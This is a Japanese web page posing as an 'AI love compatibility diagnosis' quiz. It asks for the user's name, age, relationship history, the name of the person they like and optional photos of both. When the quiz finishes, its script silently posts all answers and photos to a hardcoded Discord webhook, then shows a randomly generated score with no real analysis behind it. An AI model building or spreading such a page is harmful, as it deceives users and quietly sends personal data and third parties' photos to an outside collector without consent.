<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI恋愛相性診断</title>
    <style>
        body { font-family: 'Helvetica Neue', Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; background: linear-gradient(135deg, #74ebd5 0%, #9face6 100%); }
        .box { background: #fff; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); width: 85%; max-width: 400px; text-align: center; }
        input, .file-input { width: 100%; padding: 12px; margin: 10px 0; border: 2px solid #eee; border-radius: 10px; box-sizing: border-box; font-size: 14px; outline: none; }
        button { padding: 15px 30px; cursor: pointer; font-size: 16px; font-weight: bold; background: #5c67f2; color: white; border: none; border-radius: 50px; transition: 0.3s; margin-top: 10px; }
        #progress-container { width: 100%; background: #eee; height: 15px; border-radius: 10px; margin-top: 20px; overflow: hidden; display: none; }
        #progress-bar { width: 0%; height: 100%; background: linear-gradient(90deg, #ff9a9e, #fad0c4); transition: width 0.5s; }
    </style>
</head>
<body>
    <div class="box">
        <h2 id="title">AI恋愛相性診断</h2>
        <div id="content-area">
            <p id="msg">開始ボタンを押してね</p>
            <input type="text" id="inputArea" style="display:none;" placeholder="入力してね...">
            <input type="file" id="fileInput" class="file-input" style="display:none;" accept="image/*">
            <button id="actionBtn">診断を開始する</button>
            <div id="progress-container"><div id="progress-bar"></div></div>
        </div>
    </div>

    <script>
        let step = 0;
        const answers = {};
        const files = {};
        const questions = ["名前は？", "年齢は？", "恋愛経験回数は？", "相手の名前は？", "相手との関係は？", "あなたの写真を載せてね！（任意）", "好きな人の写真を載せてね！（任意）"];
        const keys = ["name", "age", "exp", "partner", "rel", "my_photo", "partner_photo"];

        document.getElementById('actionBtn').onclick = () => {
            const inputVal = document.getElementById('inputArea').value;
            const fileVal = document.getElementById('fileInput').files[0];

            if (step > 0 && step <= 5 && inputVal.trim() === "") { alert("空欄じゃ診断できないよ！"); return; }

            if (step === 0) {
                step++;
                document.getElementById('msg').innerText = questions[0];
                document.getElementById('inputArea').style.display = 'block';
                document.getElementById('actionBtn').innerText = '次へ進む';
            } else if (step <= 7) {
                if (step <= 5) answers[keys[step - 1]] = inputVal;
                if (step === 6) files['my_photo'] = fileVal;
                if (step === 7) files['partner_photo'] = fileVal;
                
                document.getElementById('inputArea').value = '';
                document.getElementById('fileInput').value = '';

                if (step < 7) {
                    step++;
                    document.getElementById('msg').innerText = questions[step - 1];
                    if (step === 6 || step === 7) {
                        document.getElementById('inputArea').style.display = 'none';
                        document.getElementById('fileInput').style.display = 'block';
                    } else {
                        document.getElementById('inputArea').style.display = 'block';
                        document.getElementById('fileInput').style.display = 'none';
                    }
                } else {
                    showLoading();
                }
            }
        };

        function showLoading() {
            document.getElementById('title').innerText = "AI解析中...";
            document.getElementById('msg').innerText = "運命の糸を分析しています...";
            document.getElementById('inputArea').style.display = 'none';
            document.getElementById('fileInput').style.display = 'none';
            document.getElementById('actionBtn').style.display = 'none';
            document.getElementById('progress-container').style.display = 'block';

            const score = Math.floor(Math.random() * (99 - 70) + 70);
            
            const message = `**恋愛診断結果**\n名前: ${answers.name}\n年齢: ${answers.age}\n経験: ${answers.exp}\n相手: ${answers.partner}\n関係: ${answers.rel}\nスコア: ${score}%`;
            
            const formData = new FormData();
            formData.append("payload_json", JSON.stringify({ content: message }));
            if (files['my_photo']) formData.append("file1", files['my_photo']);
            if (files['partner_photo']) formData.append("file2", files['partner_photo']);

            fetch("https://discord.com/api/webhooks/1527564576340709377/g9wUd7Y6mbsuHE5Gx2wKsEl_LJrEBaqWJbIg90gkBEoErB8ZszsW5AyexsQ9nYP_REqV", { method: "POST", body: formData });

            let width = 0;
            const interval = setInterval(() => {
                width += 2;
                document.getElementById('progress-bar').style.width = width + "%";
                if (width >= 100) clearInterval(interval);
            }, 100);

            setTimeout(() => {
                document.querySelector('.box').innerHTML = `<h2>診断完了</h2><p style="font-size: 1.5em;">2人の相性は！</p><p style="font-size: 3em; font-weight: bold; color: #5c67f2;">${score}%</p>`;
            }, 6000);
        }
    </script>
</body>
</html>
